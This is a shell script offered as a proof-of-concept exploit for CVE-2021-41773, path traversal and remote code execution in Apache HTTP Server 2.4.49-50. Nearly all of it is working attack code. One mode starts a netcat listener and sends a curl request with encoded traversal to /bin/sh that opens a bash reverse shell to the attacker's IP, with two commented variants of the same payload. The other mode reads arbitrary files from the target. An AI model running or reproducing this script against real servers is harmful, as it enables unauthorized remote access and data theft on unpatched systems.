#!/bin/sh

echo -e "\e[1;31m

<============================================================================================================>
||                               \"CVE-2021-41773 - Apache 2.4.49-50 HTTP RCE                                ||
||                                                                                                          ||
||  Author  : Mohamed Alzhrani                                                                              ||
||  Url     : https://github.com/MazX0p                                                                     ||
||  Info    : CVE-2021-41773 POC                                                                            ||
||                                                                                                          ||
||                                                                                                          ||
||                                                                                                          ||
<============================================================================================================>

                                                                                                                   \e[0m"
B='\033[0;31m'
R='\033[0;34m'
NC='\033[0m'
echo -e "\033[36m
CHOSE AN ACTION \n
1 - REVERSE SHELL\n
2 - PATH Traversal "etc/passwd"\n "

echo -e "\e[1;31mBY: xMohamed\e[0m"

read exploit
case $exploit in

	1*)
                echo "ENTER YOUR IP"
                read ipl
                echo "ENTER NC PORT"
                read port
                echo "ENTER TARGET IP"
                read target
                if [[ $(which gnome-terminal &> /dev/null) ]] ; then
                 echo "${R}YOU SHOULD INSTALL GNOME-TERMINAL${NC}"
                 echo "sudo apt-get install gnome-terminal"
                 echo -e "\033[36m
                 Do u want install it ? \n
                 1 - YES\n
                 2 - NO\n "
                 read Requ
                 case $Requ in
                   1*)
                   sudo apt-get install gnome-terminal
                   ;;

                   2*)
                    exit 0
                 	;;
                 	esac
                else
                 gnome-terminal --tab --title="Reverse Shell" --command="bash -c 'nc -lvnp $port; $SHELL'"
                 sleep 1
                 echo -ne '\n'
                 echo -ne '\n'
                 echo -ne '#                         (1%)\r'
                 echo -ne '#####                     (33%)\r'
                 sleep 2
                 echo -ne '#############             (66%)\r'
                 sleep 4
                 echo -ne '#######################   (100%)\r'
                 echo -ne '\n'
                 echo -e "${R}[+] Bl1ng bl1ng !${NC}"
                 curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/$ipl/$port 0>&1" "$target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//bin/sh"
                 #curl --data "A=|/usr/bin/bash -i >& /dev/tcp/$ipl/#port 0>&1" "http://$target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//bin/sh" -vv
                 #curl --data "A=|/bin/bash -i >& /dev/tcp/$ipl/$port 0>&1" "$target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65//bin/sh" -vv
                 echo -ne '\n'
                 echo -e "${R}[+] we got shell!${NC}"
                 echo -ne '\n'
               fi
	;;

	2*)
  echo "ENTER TARGET IP"
  read target
  echo "ENTER file path starts with /"
  read file_path
  if [[ $(which gnome-terminal &> /dev/null) ]] ; then
   echo "${R}YOU SHOULD INSTALL GNOME-TERMINAL${NC}"
   echo "sudo apt-get install gnome-terminal"
   echo -e "\033[36m
   Do u want install it ? \n
   1 - YES\n
   2 - NO\n "
   read Requ
   case $Requ in
     1*)
     sudo apt-get install gnome-terminal
     ;;

     2*)
      exit 0
    ;;
    esac
  else
    curl -s --path-as-is -d "echo Content-Type: text/plain; echo; " "$target/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$file_path"
  fi
	;;
	esac
